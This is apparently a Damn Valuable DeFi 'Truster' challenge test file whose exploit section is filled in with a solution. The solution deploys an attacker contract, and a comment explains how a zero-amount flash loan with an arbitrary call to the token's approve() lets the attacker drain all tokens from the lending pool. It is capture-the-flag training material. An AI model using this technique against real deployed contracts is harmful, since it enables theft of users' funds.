const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        /* The pool allows us to call any function: (bytes calldata data) from any contract: (address target) in its context
         * We simply call the flashloan and ask for 0 tokens
         * This way, the condition: (balanceAfter >= balanceBefore) will be true. 
         * Meanwhile, we send the ERC20 token address as the targert and call its approve() function 
         * to approve our address as the allowed spender and after returing from flashLoan() successfully, 
         * we transfer all the pool's balance to ours. 
         */
	const AttackerFactory = await ethers.getContractFactory('TrusterAttacker', attacker);
        this.attackerContract = await AttackerFactory.deploy(this.pool.address, this.token.address);
        await this.attackerContract.attack(attacker.address);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

